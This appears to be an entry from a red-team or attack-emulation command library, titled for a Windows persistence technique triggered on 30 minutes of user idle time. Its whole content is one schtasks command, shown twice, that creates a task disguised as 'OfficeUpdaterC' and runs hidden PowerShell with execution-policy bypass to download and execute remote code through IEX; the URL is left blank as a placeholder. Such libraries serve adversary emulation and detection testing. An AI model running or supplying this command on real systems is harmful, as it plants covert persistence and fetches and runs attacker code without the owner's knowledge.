---
id: 5c8fd84d-dc40-42ec-a91f-b47c04737d2c
name: (X86) - On User Idle (30mins)
type: command
executor: bash
data: 'schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe
  -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c ''IEX ((new-object
  net.webclient).downloadstring(''''''http:///''''''))''" /sc onidle /i 30

  '
output: null
created_at: '2020-07-14T18:21:10.246190+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# (X86) - On User Idle (30mins)

```bash
schtasks /create /tn OfficeUpdaterC /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http:///'''))'" /sc onidle /i 30

```


